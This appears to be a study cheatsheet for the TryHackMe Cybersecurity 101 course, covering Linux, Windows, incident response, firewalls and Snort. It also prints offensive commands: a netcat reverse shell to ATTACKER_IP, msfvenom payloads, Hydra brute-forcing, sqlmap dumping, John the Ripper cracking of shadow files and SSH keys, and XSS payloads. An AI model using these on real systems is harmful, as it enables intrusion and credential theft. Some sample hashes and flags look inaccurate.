# 🚀 TryHackMe Cybersecurity 101 Cheatsheet

This comprehensive cheatsheet covers all key concepts for the TryHackMe Cybersecurity 101 certification.

---

## 💻 Cybersecurity Fundamentals

### What is Cybersecurity?

**Definition**: The practice of protecting systems, networks, and programs from digital attacks.

**Key Concept**: "To outsmart a hacker, you need to think like one" - Offensive Security

**Offensive Security**: Simulating hacker actions to find vulnerabilities in systems
- Goal: Understand hacker tactics to improve system defenses
- Used to test and strengthen security controls

### Career Paths in Cybersecurity

**Offensive Security Roles**:
- **Penetration Tester**: Tests products for exploitable vulnerabilities
- **Red Teamer**: Simulates adversary attacks and provides feedback
- **Security Engineer**: Designs, monitors, and maintains security controls

**Defensive Security Roles**:
- **Security Analyst**: Monitors and responds to cyber threats
- **Incident Responder**: Investigates and mitigates security incidents
- **Security Architect**: Designs secure systems and infrastructure

---

## 🐧 Linux Fundamentals

### What is Linux?

**Definition**: An open-source operating system based on UNIX

**Characteristics**:
- Lightweight and efficient
- Open-source (free to use and modify)
- Multiple distributions/flavors available
- Used in servers, IoT devices, POS systems, and critical infrastructure

**Common Linux Distributions**:
- **Ubuntu**: User-friendly, widely used, good for beginners
- **Debian**: Stable, widely used
- **Fedora**: Cutting-edge features
- **Arch Linux**: Minimalist, highly customizable

**Why Linux in Cybersecurity**:
- Most Linux distributions run on systems with only 512MB RAM
- Powers websites, web applications, and critical infrastructure
- Essential skill for cybersecurity professionals

### The Terminal

**Definition**: Text-based interface for executing commands

**Characteristics**:
- No Graphical User Interface (GUI)
- Uses commands instead of clicking
- Intimidating at first but quickly becomes familiar
- Essential for cybersecurity work

**Common Terminal Uses**:
- Running hacking tools (dirb, Gobuster, etc.)
- File manipulation
- System administration
- Network testing

---

## 🛠️ Basic Linux Commands

### Navigation and Information

| Command | Description | Example |
|---------|-------------|---------|
| `whoami` | Display current user | `whoami` |
| `pwd` | Print working directory | `pwd` |
| `ls` | List files and directories | `ls -la` |
| `cd` | Change directory | `cd /home/user` |

### File Operations

| Command | Description | Example |
|---------|-------------|---------|
| `echo` | Output text to terminal | `echo "Hello World"` |
| `cat` | Display file contents | `cat filename.txt` |
| `mkdir` | Create directory | `mkdir new_folder` |
| `rm` | Remove file or directory | `rm filename.txt` |

### Text Manipulation

| Command | Description | Example |
|---------|-------------|---------|
| `cat` | Display file contents | `cat notes.md` |
| `echo` | Create and write to file | `echo "text" > file.txt` |
| `head` | Display first lines of file | `head -n 10 file.txt` |
| `tail` | Display last lines of file | `tail -n 5 file.txt` |

---

## 💻 Command Line Mastery

### Windows PowerShell

| Command | Description | Example |
|---------|-------------|---------|
| `Get-Date` | Get current date and time | `Get-Date` |
| `Get-Process` | Get running processes | `Get-Process` |
| `Get-Service` | Get list of services | `Get-Service` |
| `Get-ComputerInfo` | Get detailed system info | `Get-ComputerInfo` |
| `Get-NetIPConfiguration` | Get network configuration | `Get-NetIPConfiguration` |
| `Get-FileHash` | Calculate file hash | `Get-FileHash -Algorithm SHA256 path.txt` |
| `Get-ChildItem` | List directory contents | `Get-ChildItem` |
| `Invoke-Command` | Execute commands on remote computers | `Invoke-Command -ComputerName target.com -ScriptBlock { Get-Process }` |

**Alternate Data Streams**: `Get-Content path.txt -Stream ads_name`

**Command History**: `Get-History`, `Clear-History`

### Linux Bash Shell

| Command | Description | Example |
|---------|-------------|---------|
| `whoami` | Display current user | `whoami` |
| `pwd` | Print working directory | `pwd` |
| `ls` | List files and directories | `ls -la` |
| `cd` | Change directory | `cd /home/user` |
| `echo` | Output text to terminal | `echo "Hello World"` |
| `cat` | Display file contents | `cat filename.txt` |
| `grep` | Search for text in file | `grep pattern filename.txt` |
| `mkdir` | Create directory | `mkdir new_folder` |
| `rm` | Remove file or directory | `rm filename.txt` |
| `history` | Display command history | `history` |

**Shell Types**:
- **Bash** (Bourne Again Shell): Default shell, scripting, tab completion
- **Fish** (Friendly Interactive Shell): User-friendly, syntax highlighting
- **Zsh** (Z Shell): Advanced tab completion, customization

**Shell Features**: Tab completion, command history with UP/DOWN arrows

---

## 🪟 Windows and AD Fundamentals

### Windows Fundamentals

**Windows Versions**:
- Windows NT: First to introduce Active Directory
- Windows 7/10/11: Modern consumer versions
- Windows Server: Enterprise server editions

**Desktop Components**:
- Start Menu: Application launcher
- Taskbar: Shows open apps and system tray
- Notification Area: System status icons

**NTFS Features**:
- ACLs (Access Control Lists): File permissions
- Compression: Built-in file compression
- Encryption: EFS for data protection
- Reparse points: Symbolic links and junctions

**User Account Types**:
- Administrator: Full system access
- Standard User: Limited access
- Guest: Temporary user access

### Active Directory (AD)

**Purpose**: Centralized directory service for managing network resources

**Core Objects**:
- Users: Individual accounts
- Computers: Workstations and servers
- Security Groups: Collections for authorization
- OUs (Organizational Units): Containers for organizing objects

**AD Structure**:
- **Single Domain**: One domain contains all resources
- **Tree**: Multiple domains with same namespace
- **Forest**: Multiple trees with different namespaces

**Key Components**:
- **Domain Controller**: Server hosting AD, handles authentication
- **GPO** (Group Policy): Settings applied to users/computers
- **SYSVOL**: Shared folder containing GPOs and scripts
- **Trust Relationships**: Allow cross-domain authentication

**Authentication Protocols**:
- **Kerberos**: Default for modern Windows, time-based tickets
- **NetNTLM**: Legacy protocol, used in older systems

### Windows System Tools

**MSConfig**: Configure startup, services, boot settings
**Computer Management**: System administration (Disk Mgmt, Services, Event Viewer)
**Task Scheduler**: Schedule automatic tasks
**Event Viewer**: View system and application logs

**Disk Management**: Create/resize partitions, manage disks (diskmgmt.msc)

### Windows Commands (PowerShell)

| Command | Description | Example |
|---------|-------------|---------|
| `Get-Date` | Get current date/time | `Get-Date` |
| `Get-Process` | Get running processes | `Get-Process` |
| `Get-Service` | Get list of services | `Get-Service` |
| `Get-ComputerInfo` | Get system information | `Get-ComputerInfo` |
| `Get-NetIPConfiguration` | Get network config | `Get-NetIPConfiguration` |
| `Get-FileHash` | Calculate file hash | `Get-FileHash -Algorithm SHA256 file.txt` |
| `Get-ChildItem` | List directory contents | `Get-ChildItem` |
| `Invoke-Command` | Execute remote commands | `Invoke-Command -ComputerName target { Get-Process }` |

### Shell Scripting

**Shebang**: `#!/bin/bash`

**Execute permissions**: `chmod +x script.sh`

**Run script**: `./script.sh`

**Components**:
- Variables: `name="John"`
- Loops: `for i in {1..10}; do echo $i; done`
- Conditional: `if [ "$name" = "John" ]; then echo "Authorized"; fi`
- Comments: Start with `#`

---

## 🔍 Offensive Security Tools

### SQLMap - SQL Injection Vulnerability Scanner

**Purpose**: Automated tool to find and exploit SQL injection vulnerabilities in web applications

**Basic Usage**:
```bash
# Basic URL testing
sqlmap -u "http://sqlmaptesting.thmsearch/cat=1"

# Testing with single quotes
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1'

# In-depth scanning
sqlmap -u 'http://sqlmaptesting.thmsearch/cat=1' --level=5
```

**Common Commands**:
- `--dbs`: List all databases
- `-D <db>`: Specify database
- `--tables`: List tables in database
- `-T <table>`: Specify table
- `--columns`: List columns in table
- `--dump`: Extract table data

**POST Request Testing**:
```bash
sqlmap -r intercepted_request.txt
```

### Hydra - Brute Force Password Cracker

**Purpose**: Brute force online password cracking tool for login forms and authentication services

**Installation**:
```bash
apt install hydra
# or
dnf install hydra
```

**Basic Usage**:
```bash
# FTP brute force
hydra -l <username> -P <password_list> MACHINE_IP ftp

# SSH brute force (multi-threaded)
hydra -l <username> -P <password> MACHINE_IP -t 4 ssh

# Web form brute force (POST)
hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

### Gobuster - Directory and Subdomain Enumeration

**Purpose**: Offensive security tool for reconnaissance - enumerate web directories, subdomains, and virtual hosts

**Installation**:
```bash
gobuster --help
```

**Modes**:
1. **Directory Mode (`dir`)**:
   ```bash
   gobuster dir -u "http://www.example.thm/" -w /usr/share/wordlists/dirb/small.txt -t 64
   ```

2. **DNS Mode (`dns`)**:
   ```bash
   gobuster dns -d example.thm -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
   ```

3. **Virtual Host Mode (`vhost`)**:
   ```bash
   gobuster vhost -u "http://example.thm" -w /path/to/wordlist
   ```

**Common Flags**:
- `-r`: Follow HTTP redirect responses
- `-x .ext,.ext2`: Add file extensions
- `-t <num>`: Number of threads
- `-w <wordlist>`: Wordlist file path

### Shells - Remote System Access

**Purpose**: Software allowing users to interact with an operating system - attackers use shells to remotely control systems

**Reverse Shell** (Target connects to attacker):
```bash
# Step 1: Set up Netcat listener
attacker@kali:~$ nc -lvnp 443

# Step 2: Execute reverse shell payload
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```

**Bind Shell** (Attacker connects to target):
```bash
# Step 1: Set up bind shell
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f

# Step 2: Attacker connects
attacker@kali:~$ nc TARGET_IP 8080
```

**Difference**:
| Feature | Reverse Shell | Bind Shell |
|---------|---------------|------------|
| Initiation | Target → Attacker | Attacker → Target |
| Firewall | Easier to bypass | May be blocked |
| Port | Known to attacker | Requires port number |

**Attack Capabilities**:
- Remote System Control
- Privilege Escalation
- Data Exfiltration
- Persistence Access
- Post-Exploitation Activities
- Network Pivoting

---

## 🛡️ Defensive Security

### Incident Response Frameworks

**SANS PICERL Framework**:
| Phase | Explanation |
|-------|-------------|
| **P**reparation | Build resources, teams, plans, and security solutions |
| **I**dentification | Look for abnormal behavior that may indicate an incident |
| **C**ontainment | Minimize impact by isolating systems, disabling accounts |
| **E**radication | Remove threat from the environment |
| **R**ecovery | Recover affected systems from backups or rebuilds |
| **L**essons Learned | Identify and document gaps to improve processes |

**NIST Framework** (4 phases):
1. Preparation
2. Detection and Analysis
3. Containment, Eradication, and Recovery
4. Post-Incident Activity

### Common Incident Types

| Incident Type | Description | Impact |
|---------------|-------------|--------|
| **Malware** | Malicious software designed to harm systems | Data theft, system compromise |
| **Phishing** | Deceptive attempts to obtain sensitive information | Credential theft |
| **SQL Injection** | Injects malicious SQL code into queries | Data theft, manipulation |
| **Data Leaks** | Unauthorized exposure of confidential information | Reputational damage, legal consequences |
| **Insider Attacks** | Attacks from within the organization | Significant access to resources |
| **Denial of Service (DoS)** | Flooding systems with false requests | Service unavailability |

### Log Analysis Commands

**cat** - Display contents of text files:
```bash
cat access.log
# Combine multiple files
cat access1.log access2.log > combined_access.log
```

**grep** - Search for strings and patterns:
```bash
grep "192.168.1.1" access.log
```

**less** - View logs page by page with search capabilities:
```bash
less access.log
# Navigation:
# Space: Next page
# b: Previous page
# /pattern: Search for pattern
# n: Next match
# N: Previous match
```

### Windows Event Logs

**Primary Log Types**:
| Log Type | Description |
|----------|-------------|
| **Application** | Application-specific events (errors, warnings) |
| **System** | OS operations (driver issues, hardware, startup/shutdown) |
| **Security** | Security-related activities (authentication, authorization) |

**Important Event IDs**:
| Event ID | Description |
|----------|-------------|
| 4624 | User account successfully logged in |
| 4625 | User account failed to login |
| 4634 | User account successfully logged off |
| 4720 | User account was created |
| 4724 | Attempt made to reset account's password |
| 4722 | User account was enabled |
| 4725 | User account was disabled |
| 4726 | User account was deleted |

**Key Fields**:
- **Description**: Detailed activity information
- **Log Name**: Log file name
- **Logged**: Activity timestamp
- **Event ID**: Unique identifier

### Web Server Access Logs

**Sample Log Format**:
```
IP Address | Timestamp | Request | Status Code | User-Agent
"172.16.0.1" | "[06/Jun/2024:13:58:44]" | "GET /products HTTP/1.1" | "200" | "Mozilla/5.0..."
```

**Common Status Codes**:
- **200**: OK - Request successful
- **404**: Not Found - Resource not available
- **500**: Internal Server Error - Server-side error
- **401**: Unauthorized - Authentication required
- **403**: Forbidden - Access denied

### Types of Logs

| Log Type | Usage | Examples |
|----------|-------|----------|
| **System Logs** | Troubleshooting running issues | Startup/shutdown, driver events, errors |
| **Security Logs** | Detect and investigate incidents | Authentication, authorization, policy changes |
| **Application Logs** | Application-specific events | User interaction, application updates, errors |
| **Audit Logs** | Detailed system/user events for compliance | Data access, system changes, user activity |
| **Network Logs** | Network traffic information | Incoming/outgoing traffic, connection logs |
| **Access Logs** | Resource access information | Webserver, database, application access |

### Incident Response Tools

| Tool | Purpose |
|------|---------|
| **SIEM** | Collects and correlates logs to identify incidents |
| **AV** | Detects known malicious programs and scans systems |
| **EDR** | Protects against advanced threats, can contain and eradicate |

---

## 📚 Learning Resources

### Practical Practice

**Use Virtual Machines**:
- Safe, legal environment for hacking practice
- TryHackMe provides simulated environments
- Labs can be reverted to initial state

**Build Daily Learning Habits**:
- Start with basic tools (dirb, Gobuster)
- Practice regularly with hands-on exercises
- Break down complex topics into manageable areas

### Recommended Learning Path

1. **Understand Concepts**: Learn what offensive security is and why it matters
2. **Practice with Tools**: Use dirb to find hidden pages
3. **Master Linux**: Learn basic terminal commands
4. **Explore Career Paths**: Understand different cybersecurity roles
5. **Build Skills**: Practice regularly on platforms like TryHackMe

---

## 🔐 Cryptography

### What is Password Hashing?

**Definition**: Converting plaintext passwords into fixed-length hash strings that cannot be reversed.

**Why Hash Passwords**:
- Stored passwords cannot be reversed (unlike encryption)
- Prevents plaintext exposure if database is compromised
- Enables verification without knowing actual password
- Time-consuming process slows down brute-force attacks

### Common Hash Formats

| Hash Format | Algorithm | Description |
|-------------|-----------|-------------|
| `$6$` | SHA-512crypt | Strong, Unix-like hashing |
| `$2a$` or `$2b$` | Blowfish | bcrypt variant |
| `$5$` | SHA-256crypt | SHA-256 based hashing |
| `$1$` | MD5crypt | Legacy Unix hashing |
| `raw-sha256` | SHA-256 | Raw hash without salt |

### /etc/passwd and /etc/shadow

**/etc/passwd** contains user account info:
```
username:x:UID:GID:GECOS:HOME_DIR:SHELL
```

**/etc/shadow** contains encrypted passwords (root only):
```
username:encrypted_password:last_changed:min:max:warn:expire:inactive:reserved
```

---

## 🛠️ John the Ripper

**Purpose**: Fast password cracker for Linux/Unix, Windows, macOS.

### Installation

**Kali Linux / AttackBox**:
```bash
sudo apt-get install john
```

### Wordlist Mode

**Purpose**: Uses pre-built wordlist of possible passwords.

**Common Wordlists**:

| Wordlist | Size | Description |
|----------|------|-------------|
| `rockyou.txt` | ~14 million | Most popular English wordlist |
| `password.txt` | ~10,000 | Simple password list |
| `common.txt` | ~20,000 | Common passwords and variations |

**Basic Usage**:
```bash
john --wordlist=[wordlist] --format=[format] [hash_file]
```

**Examples**:

#### Crack /etc/shadow hashes
```bash
# Convert to readable format
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Crack using rockyou.txt (auto-detect SHA-512crypt)
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Specify format explicitly
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```

#### Crack SHA-256 hashes
```bash
# Create hashes.txt with raw SHA-256 hashes
echo "password" | sha256sum > hashes.txt

# Crack using wordlist
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha256 hashes.txt
```

#### View cracked passwords
```bash
# Show all cracked passwords
john --show unshadowed.txt

# List candidates attempted but failed
john --list=wordlists unshadowed.txt
```

**Hash File Format**:
```
username:hash_value
```

### Single Crack Mode

**Purpose**: Heuristic mode that modifies username and GECOS field to crack passwords.

**How It Works**:
- Add numbers to username (user1, user2, user3)
- Capitalize letters (Uppercase, Lowercase)
- Add special characters (password!, password$)
- Use information from GECOS field

**Usage**:
```bash
john --single --format=[format] [hash_file]
```

**Example**:
```bash
john --single --format=raw-sha256 hashes.txt
john --single --format=sha512crypt unshadowed.txt
```

### Custom Rules

**Purpose**: Define password generation patterns for predictable password structures.

**Rule Syntax**:
```ini
[List.Rules:RULE_NAME]
rule_sequence
```

**Common Modifiers**:

| Modifier | Description | Example |
|----------|-------------|---------|
| `c` | Capitalize first character | `c` makes "mark" → "Mark" |
| `u` | Convert to uppercase | `u` makes "mark" → "MARK" |
| `l` | Convert to lowercase | `l` makes "MARK" → "mark" |
| `s` | Swap case | `s` makes "MaRK" → "mArK" |
| `A0` | Prepend characters | `A0"[0-9]"` adds numbers to start |
| `Az` | Append characters | `Az"[!@#$]"` adds symbols to end |
| `lC` | Lowercase except first char | `lC` makes "MaRK" → "mARK" |
| `Cl` | Capitalize except first char | `Cl` makes "mark" → "MArk" |

**Character Sets**:

| Character Set | Range | Example |
|---------------|-------|---------|
| `[0-9]` | Digits 0-9 | `Az"[0-9]"` |
| `[0]` | Only digit 0 | `Az"[0]"` |
| `[A-Z]` | Uppercase letters | `Az"[A-Z]"` |
| `[a-z]` | Lowercase letters | `Az"[a-z]"` |
| `[A-z]` | All letters | `Az"[A-z]"` |
| `[!£$%@]` | Specific symbols | `Az"[!£$%@]"` |
| `[a]` | Single character 'a' | `Az"[a]"` |
| `[0-9a-zA-Z]` | Alphanumeric | `Az"[0-9a-zA-Z]"` |

**Examples**:

**Example 1: Password pattern "Polopassword1!"**
```ini
[List.Rules:PoloPassword]
cAz"[0-9] [!£$%@]"
```

**Example 2: Capital first, lowercase rest, append numbers**
```ini
[List.Rules:CamelCaseNumbers]
cAz"[0-9]"
```

**Example 3: Prepend numbers and special characters**
```ini
[List.Rules:SpecialFirst]
A0"[0-9]!@#]"Az"[0-9]"
```

**Using Custom Rules**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --rule=PoloPassword unshadowed.txt
```

### Cracking Password-Protected Archives

#### Zip Files

**Convert Zip to John hash**:
```bash
zip2john zipfile.zip > zip_hash.txt
```

**Output format**:
```
zipfile.zip/john:$zip$2*0*3000*4*8*8*b4be6e0*5*30*c4b4f7*4*0*0*6bae8b*
```

**Crack the hash**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
```

#### RAR Files

**Convert RAR to John hash**:
```bash
rar2john rarfile.rar > rar_hash.txt
```

**Output format**:
```
rarfile.rar:$rar5$*3e*4*0*0*e0b3c4f8a1d6b2e4*1*4*a7b3d8f2c5e1a4b6*...
```

**Crack the hash**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt rar_hash.txt
```

### SSH Key Password Cracking

**Purpose**: Crack passwords protecting SSH private keys.

**Convert SSH private key to John hash**:
```bash
ssh2john id_rsa > id_rsa_hash.txt
```

**Output format**:
```
id_rsa:$ssh2$1024$2a3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2$h3k4l5m6n7o8p9q0r1s2t3u4v5w6x7y8z9a0b1c2d3e4f5g6h7i8j9k0l1m2n3o4p5q6r7s8t9u0v1w2x3y4z5a6b7c8d9e0f1g2*
```

**Crack the hash**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_hash.txt
```

**Using the cracked password**:
```bash
ssh -i id_rsa username@target_ip
```

### John Features

**Password Cracking Modes**:

| Mode | Description |
|------|-------------|
| `--wordlist` | Standard wordlist mode |
| `--single` | Heuristic single crack mode |
| `--incremental` | Incremental mode (generate words by incrementing) |
| `--mask` | Mask mode (pattern-based cracking) |
| `--rules` | Apply custom rules |

**Incremental Mode**:
```bash
john --incremental id_rsa_hash.txt
```

**Mask Mode**:
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --mask='?l?d?d?d?d?d' hashes.txt
```

**Performance Optimization**:
```bash
# Use GPU (if supported)
john --format=raw-sha256 --gpu id_rsa_hash.txt

# Use multiple cores
john -t 4 --wordlist=rockyou.txt unshadowed.txt
```

### Common Password Patterns

❌ **Bad Patterns**:
```
Password123!
Password@2024
MyPassword123
Qwerty12345
Admin@123
name123
company123
```

✅ **Good Patterns**:
```
correct-horse-battery-staple (passphrase)
3j#9K$2mP@5nL (random but memorable)
use-a-unique-password-for-every-site
```

### Security Best Practices

1. **Use strong, unique passwords**: Minimum 12+ characters, mixed case, numbers, symbols
2. **Use a password manager**: Generate and store complex passwords
3. **Enable multi-factor authentication (MFA)**: Even if passwords are cracked
4. **Don't reuse passwords**: Compromise on one site doesn't affect others

---

## 🎯 Key Takeaways

### Offensive Security
- Simulating hacker actions to find vulnerabilities
- "To outsmart a hacker, you need to think like one"
- Essential for improving system defenses

### Linux in Cybersecurity
- Used everywhere: websites, IoT, POS, critical infrastructure
- Lightweight and efficient
- Terminal is essential for cybersecurity work
- Learn basic commands to navigate and manipulate files

### Career Opportunities
- Both offensive and defensive security roles available
- Growing demand for cybersecurity professionals
- Variety of paths from analyst to architect

### Practical Skills
- Use virtual machines for safe practice
- Start with basic tools and commands
- Build daily learning habits
- Practice on platforms like TryHackMe

### Cryptography
- Password hashing converts plaintext to irreversible hash strings
- Common hash formats: SHA-512crypt ($6$), Blowfish ($2a$/$2b$), SHA-256crypt ($5$)
- John the Ripper is a powerful password cracker
- Wordlist mode uses pre-built password lists
- Single crack mode exploits predictable patterns
- Custom rules define password generation patterns
- Crack password-protected archives (Zip, RAR) and SSH keys
- Strong passwords and MFA protect against cracking

---

## 🎣 Exploitation Basics

### Key Concepts
- **Vulnerability**: A weakness that can be exploited
- **Exploit**: Code or technique that takes advantage of a vulnerability
- **Payload**: Code executed on the target system after exploitation
- **Handler**: Component that receives the connection and spawns the shell

### Metasploit Framework Components
- **msfconsole**: The interactive command-line interface
- **msfvenom**: Tool for creating payloads
- **Database**: Stores target information and exploitation data
- **Modules**: Reusable exploit/payload code

### Common Exploit Modules
```bash
msfconsole
msf6 > search apache vulnerability
msf6 > search windows smb
msf6 > use exploit/xxxx/xxxx
```

Working with exploit modules:
```bash
msf6 > use exploit/.......
msf6 exploit(.......) > show targets
msf6 exploit(.......) > show options
msf6 exploit(.......) > set TARGET 1
msf6 exploit(.......) > exploit
```

### Payload Types
- **Reverse Shell**: Target connects back to the attacker
- **Bind Shell**: Attacker connects to a service listening on the target
- **Meterpreter**: Advanced payload for post-exploitation

### Payload Creation with msfvenom
```bash
msfvenom -p [PAYLOAD_TYPE] LHOST=[ATTACKER_IP] LPORT=[PORT] -f [FORMAT] > [OUTPUT_FILE]
```

Common payload examples:
- Linux ELF: `msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=7777 -f elf > rev_shell.elf`
- Windows Executable: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=7777 -f exe > rev_shell.exe`
- PHP: `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=7777 -f raw > rev_shell.php`
- Python: `msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=7777 -f raw > rev_shell.py`

### Post-Exploitation Techniques
- **Privilege Escalation**: Gaining higher privileges than initially obtained
- **Session Management**: Managing and upgrading shell sessions
- **Data Exfiltration**: Extracting sensitive information
- **Persistence**: Setting up ways to maintain access

Metasploit post-exploitation modules:
- Privilege escalation: `post/windows/gather/hashdump`
- System information gathering
- Credential dumping
- Keylogging
- Browser exploitation

---

## 🌐 Web Hacking

### Web Application Basics

**Components**:
- **Client-Side**: HTML (structure), CSS (styling), JavaScript (behavior)
- **Server-Side**: Backend logic, database interactions, authentication, API endpoints

**HTTP Methods**:
- **GET**: Retrieve data from a server
- **POST**: Submit data to be processed
- **PUT**: Update existing data
- **DELETE**: Remove data

### JavaScript Essentials

**Key Concepts**:
- DOM Manipulation: Accessing and modifying Document Object Model
- Event Handling: Responding to user interactions
- AJAX/Fetch: Asynchronous requests to server endpoints
- Cookies: Client-side data storage
- LocalStorage: Persistent client-side storage

**Security Implications**:
- **XSS (Cross-Site Scripting)**: Injecting malicious scripts into web pages
- **CSRF (Cross-Site Request Forgery)**: Forcing users to perform unintended actions
- Client-side validation bypasses
- Information leakage through console logs

**Client-Side Filter Bypasses**:
- Commenting out code: `<!-- <script> -->`
- Using HTML entities: `&lt;script&gt;`
- URL encoding: `%3Cscript%3E`
- Encoding after opening tag: `<s%63ript>alert(1)</s%63ript>`

### SQL Fundamentals

**SQL Operations**:
- **SELECT**: Retrieve data from a database
- **INSERT**: Add new records
- **UPDATE**: Modify existing records
- **DELETE**: Remove records

**SQL Injection Types**:
- **In-band**: Same channel for injection and extraction (UNION-based)
- **Error-based**: Information through database errors
- **Out-of-band**: Different channels (DNS, email) for extraction
- **Blind**: Boolean responses or timing delays

**SQL Injection Effects**:
1. Read sensitive data
2. Modify, insert, or delete data
3. Bypass authentication
4. Perform administrative operations

### Burp Suite Basics

**Interface Quadrants**:
1. **Tasks**: Background tasks like "Live Passive Crawl"
2. **Event Log**: Records actions and connection details
3. **Issue Activity**: Vulnerability scanner results (Professional)
4. **Advisory**: Detailed vulnerability info (Professional)

**Keyboard Shortcuts**:
- `Ctrl + Shift + D`: Dashboard
- `Ctrl + Shift + T`: Target tab
- `Ctrl + Shift + P`: Proxy tab
- `Ctrl + Shift + I`: Intruder tab
- `Ctrl + Shift + R`: Repeater tab

**Proxy Features**:
- Intercept and modify requests before server
- Capture and log all traffic
- WebSocket support
- Response interception (configurable)

**Scoping**:
1. Switch to Target tab
2. Right-click target → "Add To Scope"
3. Select "URL Is in target scope" for interception

**Burp Certificate**:
1. Download: `http://burp/cert` → `cacert.der`
2. Firefox: `about:preferences` → "View Certificates" → "Import"
3. Set "Trust this to identify websites"

**Practice Exercise**:
- Test `http://MACHINE_IP/ticket/` for:
  - Reflective XSS vulnerabilities
  - Client-side filter bypasses
  - SQL injection in form inputs

**Burp Workflow for XSS**:
1. Activate proxy with intercept ON
2. Submit form with legitimate data
3. Intercept request in Burp
4. Change email field to: `<script>alert("Succ3ssful XSS")</script>`
5. URL encode with `Ctrl + U`
6. Forward request

**Useful Extensions**:
- **Comparer**: Compare data at word or byte level
- **Sequencer**: Test randomness of tokens
- **Logger++**: Enhanced logging
- **Extensions**: Java/Python/Ruby, loaded via Extender module

---

## 🔒 Security Solutions

### Firewalls

**Overview**: Network security system that monitors and controls incoming/outgoing traffic based on security rules.

**Types of Firewalls**:

| Type | Description | Key Characteristics |
|------|-------------|---------------------|
| **Packet Filter** | Examines individual packets | Stateless, simple, low overhead |
| **Stateful Inspection** | Tracks connection states and context | Maintains state tables, allows return traffic |
| **Proxy** | Acts as intermediary between hosts | Server-side filtering, hides internal network |
| **Next-Generation** | Combines multiple security features | Unified platform, application-layer awareness |

**UFW (Uncomplicated Firewall) - Ubuntu**:

**Basic Commands**:
```bash
sudo ufw enable          # Enable firewall
sudo ufw disable         # Disable firewall
sudo ufw status          # Check status
```

**Default Policies**:
```bash
sudo ufw default deny incoming   # Deny incoming traffic
sudo ufw default allow outgoing  # Allow outgoing traffic
```

**Rule Examples**:
```bash
sudo ufw allow 22/tcp              # Allow SSH
sudo ufw allow 80/tcp              # Allow HTTP
sudo ufw allow 3000:3500/tcp       # Allow port range
sudo ufw allow from 192.168.1.100  # Allow specific IP
sudo ufw allow from 192.168.1.0/24 # Allow network range
```

**Scenario: Allow Web and SSH**:
```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
```

---

### Intrusion Detection Systems (IDS)

**Overview**: Detects and alerts on security threats that bypass the firewall.

**Types**:
| Type | Description | Best Use |
|------|-------------|----------|
| **HIDS** | Installed on individual hosts | Critical servers, databases |
| **NIDS** | Installed on network | Network-wide threat detection |

**Detection Methods**:
| Method | Description | Best For |
|--------|-------------|----------|
| **Signature-Based** | Compares to known attack patterns | Known threats, quick detection |
| **Anomaly-Based** | Detects deviations from baseline | Zero-day attacks |
| **Hybrid** | Combines both methods | Comprehensive detection |

**CVSS Scoring**:

| Score Range | Severity |
|-------------|----------|
| 0.0 - 3.9 | Low |
| 4.0 - 6.9 | Medium |
| 7.0 - 8.9 | High |
| 9.0 - 10.0 | Critical |

**Example**: CVE-2024-1234 (Year + arbitrary digits)

---

### Snort - Network IDS

**Directory Structure**:
```
/etc/snort/
├── snort.conf          # Main config
├── rules/              # Rule files
│   └── local.rules     # Custom rules
└── classification.config  # Classifications
```

**Rule Format**:
```
ACTION PROTOCOL SRC_IP SRC_PORT DST_IP DST_PORT (METADATA)
```

**Components**:
| Component | Description | Example |
|-----------|-------------|---------|
| **Action** | Action when rule triggers | `alert` |
| **Protocol** | Network protocol | `icmp`, `tcp`, `udp` |
| **Source IP** | Originating IP | `any`, `$HOME_NET` |
| **Source Port** | Originating port | `any`, `80` |
| **Destination IP** | Destination IP | `$HOME_NET`, `127.0.0.1` |
| **Destination Port** | Destination port | `any`, `443` |
| **Message** | Alert description | `"Ping Detected"` |
| **sid** | Unique rule ID | `10001` |
| **rev** | Rule version | `1`, `2` |

**Create Custom Rule**:
```bash
# Edit local.rules
sudo nano /etc/snort/rules/local.rules

# Add rule
alert icmp any any -> $HOME_NET any (msg:"ICMP Ping Detected"; sid:10001; rev:1;)
```

**Run Snort**:
```bash
# Detection mode
sudo snort -q -l /var/log/snort -i lo -A console -c /etc/snort/snort.conf

# Test with ping
ping 127.0.0.1

# On PCAP file
sudo snort -q -l /var/log/snort -r Task.pcap -A console -c /etc/snort/snort.conf
```

**Command Parameters**:
| Parameter | Description |
|-----------|-------------|
| `-q` | Quiet mode |
| `-l` | Log directory |
| `-i` | Network interface |
| `-A` | Output mode (console, alert) |
| `-c` | Configuration file |
| `-r` | Input PCAP file |

---

### Vulnerability Scanners

**Why Regular Scanning is Important**:
- Identifies weaknesses before exploitation
- Required for compliance
- Provides threat visibility
- Helps prevent breaches

**Scan Types**:
| Type | Credentials | Best Use |
|------|-------------|----------|
| **Authenticated** | Yes | Internal assessment |
| **Unauthenticated** | No | External scanning |
| **Internal** | Varies | Internal network |
| **External** | No | Public exposure |

**Common Tools**:
| Tool | Type | Features |
|------|------|----------|
| **Nessus** | Proprietary | Extensive DB, professional reports |
